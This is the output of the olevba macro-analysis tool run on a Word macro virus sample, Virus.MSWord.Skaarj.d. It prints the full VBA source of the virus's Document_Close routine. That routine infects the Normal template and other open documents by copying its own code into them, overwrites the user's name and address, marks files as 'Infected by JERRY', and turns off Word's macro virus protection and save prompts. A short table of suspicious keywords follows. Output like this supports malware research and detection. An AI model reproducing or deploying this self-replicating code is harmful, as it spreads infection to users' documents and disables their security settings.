olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Skaarj.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Skaarj.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Const Mark = "JERRY © MoDule-S 2002"
    On Error GoTo handler
    Dim WDoc As Word.Document, M As Object, c As Object, Infected As Boolean, Found As Boolean
    Dim Saved As Boolean, Mon As String, Phrase As Byte, t As Long, i As Long, n As Boolean, Process As Byte
    Set M = Nothing
    n = False
If Application.UserName <> "IDm@n" Then
MsgBox "JERRY is running." & Chr(10) & "Thank you!", vbInformation, Mark
With Application
.UserName = "IDm@n"
.UserInitials = "MDS"
.UserAddress = "idman@nwgsm.ru"
End With
With ActiveDocument
.BuiltInDocumentProperties(1) = Mark
.BuiltInDocumentProperties(2) = "Infected by JERRY"
.BuiltInDocumentProperties(3) = "IDm@n"
.BuiltInDocumentProperties(4) = "MoDule-S"
.BuiltInDocumentProperties(5) = "© MoDule-S 2002"
.Saved = True
End With
End If
Process = 0
Found = False
    For Each c In NormalTemplate.VBProject.VBComponents
        If c.Type = 100 Then
            If c.CodeModule.Find(Mark, 1, 1, 100000, 100000) Then
                Found = True
                Set M = c.CodeModule
            End If
        End If
    Next
    Do
        For Each WDoc In Word.Documents
            If WDoc.SaveFormat = wdFormatDocument Or WDoc.SaveFormat = wdFormatTemplate Then
                For Each c In WDoc.VBProject.VBComponents
                    If c.Type = 100 Then
                        If c.CodeModule.Find(Mark, 1, 1, 100000, 100000) Then
                            Set M = c.CodeModule
                            Found = True
        ElseIf Found Then
                            Saved = WDoc.Saved
                            On Error GoTo handler
                            t = c.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                            c.CodeModule.DeleteLines t, c.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
out:
                            c.CodeModule.InsertLines t, M.Lines(M.ProcBodyLine("Document_Close", vbext_pk_Proc), M.ProcCountLines("Document_Close", vbext_pk_Proc))
                            If Saved Then WDoc.Save
                            Infected = True
                            Else
                            frmMain.Show
                        End If
                    End If
                Next
            End If
        Next
        Process = Process + 1
        If Process = 3 Then Exit Do
    Loop Until Infected
    If Found Then
         For Each c In NormalTemplate.VBProject.VBComponents
            If c.Type = 100 Then
                If Not c.CodeModule.Find(Mark, 1, 1, 100000, 100000) Then
                    Saved = NormalTemplate.Saved
                    n = True
                    t = c.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                    c.CodeModule.DeleteLines t, c.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
out1:
                    c.CodeModule.InsertLines t, M.Lines(M.ProcBodyLine("Document_Close", vbext_pk_Proc), M.ProcCountLines("Document_Close", vbext_pk_Proc))
                    If Saved Then NormalTemplate.Save

                    End If
            End If
        Next
    End If

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    Exit Sub
handler:
    t = 1
    If n = False Then
        Resume out
    Else
        Resume out1
    End If
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

